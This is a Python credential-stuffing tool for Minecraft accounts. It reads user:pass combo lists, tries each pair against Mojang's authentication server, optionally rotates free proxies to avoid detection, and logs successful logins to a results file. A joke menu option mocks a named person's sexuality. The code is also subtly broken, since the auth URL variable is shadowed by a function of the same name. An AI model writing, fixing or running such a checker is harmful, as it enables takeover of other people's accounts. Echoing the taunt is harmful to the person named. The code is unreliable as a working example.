import requests
import time
import asyncio
import sys
from itertools import cycle

import fproxy

dat = True
jsonheaders = {"Content-Type": "application/json", 'Pragma': 'no-cache'}


auth = 'https://authserver.mojang.com/authenticate'

nfa = 0
hits = 0
bad = 0
skips = 0
checks = 0

results = open("results.txt", "a")


def auth(user, password, use_proxy: bool):
    payload = (
        {
            'agent': {
                'name': 'Minecraft',
                'version': 1
            },
            'username': user,
            'password': password,
            'requestUser': 'true'
        })
    try:
        if use_proxy:
            proxies = fproxy.get_proxies()
            proxypool = cycle(proxies)
            proxy = next(proxypool)
            r = requests.post(url=auth, json=payload, headers=jsonheaders, proxies={"http": proxy, "https": proxy})
        else:
            r = requests.post(url=auth, json=payload, headers=jsonheaders)
        if r.status_code == 200:
            return 1
        else:
            return 0
    except Exception as e:
        return 2


def checkAccount(use_proxy: bool):
    file = input('Please enter the name of your file!\n> ')
    while not file.endswith('.txt'):
        print("Error: File must be a txt file. Please try again.")
        file = input('Please enter the name of your file!\n> ')
    try:
        with open(file) as f:
            lines = f.readlines()
    except FileNotFoundError:
        print(f"Couldn't find a file named '{file}'. Please double check your spelling, and try again.")
        input("Press enter to exit.")
        sys.exit(0)

    if len(lines) == 0:
        print("The file you provided is empty! Is that the right file?")
        input("Press enter to exit.")
        sys.exit(0)

    for line in lines:
        array = line.split(':')
        if len(array) != 2:
            print(f"The following line is either not formatted correctly, or is not a user:pass set. Skipping this line...\n{line}")
            continue
        user = array[0]
        passwrd = array[1]
        if auth(user, passwrd, use_proxy) == 1:
            print(f"[{user}:{passwrd}] Hit")
            results.write(user + ':' + passwrd)
        else:
            print(f"[{user}:{passwrd}]  Miss")


def printMenu():
    print(
        "Menu:\n",
        " [A] Minecraft w/ Free Proxy Scraper (skips line if proxy doesn't work)\n",
        " [B] Minecraft w/o Proxies\n",
        " [G] is Chrusher chris into men?\n"
    )


async def main():
    printMenu()
    choice = input('> ')
    while choice not in ('A', 'B', 'G'):
        print(f"Error: Inputted value of '{choice}' not an option. Please try again.")
        printMenu()
        choice = input('> ')
    if choice == 'A':
        checkAccount(True)
    elif choice == 'B':
        checkAccount(False)
    elif choice == 'G':
        print('Yes crusher chris is into men\n :D\n :D\n :D')

asyncio.get_event_loop().run_until_complete(main())
